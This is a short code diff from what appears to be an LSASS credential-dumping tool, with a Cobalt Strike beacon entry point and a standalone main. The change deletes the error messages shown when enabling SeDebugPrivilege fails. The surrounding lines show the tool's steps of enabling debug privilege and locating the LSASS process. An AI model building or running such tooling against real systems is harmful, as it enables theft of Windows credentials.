@@ -816,13 +816,7 @@ void go(char* args, int length)
 
     success = enable_debug_priv();
     if (!success)
-    {
-        BeaconPrintf(
-            CALLBACK_ERROR,
-            "Could not enable 'SeDebugPrivilege'"
-        );
         return;
-    }
 
     // if not provided, get the PID of LSASS
     if (!pid)
@@ -1155,12 +1149,7 @@ int main(int argc, char* argv[])
 
     success = enable_debug_priv();
     if (!success)
-    {
-        printf(
-            "Could not enable 'SeDebugPrivilege'\n"
-        );
         return -1;
-    }
 
     // if not provided, get the PID of LSASS
     if (!pid)
